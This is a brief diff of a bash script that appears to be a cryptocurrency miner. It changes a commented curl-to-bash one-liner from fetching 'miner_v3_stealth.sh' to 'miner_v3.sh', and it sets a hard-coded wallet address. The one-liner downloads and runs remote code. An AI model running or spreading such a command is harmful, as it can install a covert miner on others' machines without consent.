@@ -1,5 +1,5 @@
 #!/bin/bash
-# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3_stealth.sh)
+# bash <(curl -sSL https://raw.githubusercontent.com/DucManh206/rawtext/main/miner_v3.sh)
 
 # ========== CONFIG ==========
 WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
